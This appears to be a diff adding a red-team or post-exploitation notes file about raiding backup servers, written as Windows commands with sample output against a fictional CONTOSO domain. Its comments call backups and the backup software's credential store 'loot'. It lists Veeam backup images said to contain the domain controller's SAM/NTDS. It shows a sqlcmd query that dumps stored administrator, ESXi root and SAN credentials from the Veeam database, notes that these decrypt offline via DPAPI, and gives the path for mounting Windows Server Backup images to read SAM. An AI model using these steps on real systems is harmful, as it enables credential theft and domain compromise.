@@ -1,0 +1,25 @@
+:: Backup software keeps its OWN credential store (to reach hosts/repos), plus
+:: the backups themselves. Both are loot.
+
+C:\> dir "C:\Program Files\Veeam\Backup and Replication\Backup"
+06/22/2026  01:00 AM    <DIR>          .
+06/22/2026  01:00 AM     8,589,934,592 CONTOSO-DC02.vbk        <- full backup (contains SAM/NTDS)
+06/22/2026  01:00 AM       268,435,456 CONTOSO-DC02.vib        <- incremental
+06/22/2026  01:00 AM    12,884,901,888 CONTOSO-SQL02.vbk       <- SQL server image
+06/22/2026  01:00 AM     4,294,967,296 CONTOSO-FILE02.vbk
+
+:: Veeam config DB (SQL Server Express) stores credentials the app uses to log
+:: into each protected host. Historically decryptable offline from the DB +
+:: DPAPI. Represented here as a query result:
+
+sqlcmd -S .\VEEAMSQL2016 -d VeeamBackup -Q "SELECT user_name, description FROM Credentials"
+user_name                    description
+---------------------------  ------------------------------
+CONTOSO\svc_veeam            Backup service account
+CONTOSO\Administrator        DC/App admin
+root@203.0.113.20            ESXi host 1
+storageadmin@203.0.113.30    SAN management
+
+:: Windows Server Backup equivalent lands at:
+::   \\wsb-target\WindowsImageBackup\<host>\Backup <date>\*.vhdx
+:: and the same "mount -> read config\SAM" applies.
